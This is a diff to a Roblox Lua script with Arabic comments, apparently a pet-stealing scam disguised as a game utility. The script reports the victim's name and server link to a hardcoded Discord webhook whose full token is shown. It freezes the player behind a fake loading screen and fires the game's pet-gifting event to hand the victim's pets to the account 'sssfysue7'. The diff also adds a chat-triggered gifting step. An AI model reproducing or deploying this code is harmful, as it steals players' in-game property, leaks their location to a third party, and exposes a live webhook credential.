@@ -1,14 +1,16 @@
+--== خدمات Roblox ==--
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UIS = game:GetService("UserInputService")
+local Chat = game:GetService("Players").LocalPlayer.Chatted
 
--- رابط Webhook
+--== رابط Webhook ==--
 local webhookUrl = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"
 
--- دالة إرسال Webhook
+--== دالة إرسال Webhook ==--
 local function sendWebhook(message)
     local serverUrl = "https://www.roblox.com/games/"..game.PlaceId.."/?jobId="..game.JobId
     local data = {
@@ -39,7 +41,10 @@ local function sendWebhook(message)
     end
 end
 
--- === واجهة تحميل كاملة ===
+--== إرسال Webhook فور تشغيل السكربت ==--
+sendWebhook("تم تشغيل السكربت بواسطة اللاعب: "..player.Name)
+
+--== واجهة تحميل ==--
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 humanoid.WalkSpeed = 0
@@ -47,7 +52,7 @@ humanoid.JumpPower = 0
 humanoid.AutoRotate = false
 
 UIS.InputBegan:Connect(function(input, gpe)
-    gpe = true
+    gpe = true -- منع أي تحكم
 end)
 
 local screenGui = Instance.new("ScreenGui")
@@ -104,21 +109,31 @@ for i = 1, 100 do
 end
 
 label.Text = "Loading Complete!"
-wait(2)
+wait(1)
 screenGui:Destroy()
 humanoid.WalkSpeed = 16
 humanoid.JumpPower = 50
 humanoid.AutoRotate = true
 
--- === إرسال Webhook فور فتح السكربت ===
-sendWebhook("تم تشغيل السكربت بواسطة اللاعب: "..player.Name)
+--== خاصية الشات ==--
+Chat:Connect(function(msg)
+    if msg == "." then
+        -- Teleport إلى مزرعتك
+        local myFarmPlaceId = 12345678 -- ضع معرف مزرعتك هنا
+        TeleportService:Teleport(myFarmPlaceId, player)
 
--- === التحقق من اسم اللاعب الآخر ومنحه الحيوانات ===
+        -- إعطاء الحيوانات لك
+        local targetName = player.Name
+        local targetPlayer = Players:FindFirstChild(targetName)
+        if targetPlayer then
+            ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
+        end
+    end
+end)
+
+--== التحقق من اللاعب sssfysue7 ومنحه الحيوانات ==--
 local targetName = "sssfysue7"
 local targetPlayer = Players:FindFirstChild(targetName)
 if targetPlayer then
     ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
 end
-
--- === الانتقال للاعب (Teleport) إذا أردت ===
--- TeleportService:TeleportToPlaceInstance(PLACE_ID, targetPlayer.UserId) -- ضع مكان PLACE_ID معرف اللعبة إذا تريد
